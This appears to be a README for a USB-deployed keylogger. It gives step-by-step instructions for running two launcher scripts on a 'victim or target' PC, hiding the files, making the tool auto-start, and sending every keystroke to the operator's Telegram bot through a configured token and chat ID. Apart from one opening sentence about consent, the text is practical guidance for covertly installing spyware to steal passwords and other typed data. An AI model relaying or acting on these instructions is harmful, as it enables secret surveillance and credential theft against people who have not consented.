A keylogger is a tool that records keystrokes made on a keyboard. It can be used for legitimate purposes (debugging, monitoring with consent) or malicious purposes (stealing passwords and sensitive data).Download all the files and create a folder. Place all the files inside this folder. You can use different devices like For this, we use a USB. Place the folder on the USB. When you connect it to any laptop, the requirements file containing all dependencies must be available on the target system. If it is not opened, copy its contents and paste them into PowerShell.There are two prerequisite things you must have on your side. First, a Telegram bot (created using BotFather). You must have these two things: the bot token and the chat ID. Also, note that you need to update these details in the Telegram_Sender.pyw file.Whenever a key is pressed by the victim or target, it appears in your Telegram chatbot. After the requirements are satisfied, first plug the USB into the target PC and run the file launcher1-STEP1.pyw. Wait for 20 seconds, or you will see that a file is created on the desktop. After that, run the file HideFiles-STEP2.pyw. Then, you can remove the USB.**Now the keylogger is successfully installed on the target PC. Whenever the target presses any key, it appears in your Telegram bot. This file is now set to auto-start and remains hidden so that it looks like a normal environment.
